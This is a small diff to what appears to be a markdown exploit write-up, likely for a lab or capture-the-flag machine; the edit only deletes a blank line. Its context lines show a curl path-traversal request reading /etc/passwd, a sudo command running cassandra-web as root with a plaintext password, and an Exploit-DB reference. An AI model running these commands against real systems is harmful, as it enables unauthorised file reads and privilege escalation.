@@ -37,7 +37,6 @@ curl --path-as-is http://TARGET:3000/../../../../../../../../etc/passwd
 sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330
 ```
 
-
 ### References
 
 - https://www.exploit-db.com/exploits/49362
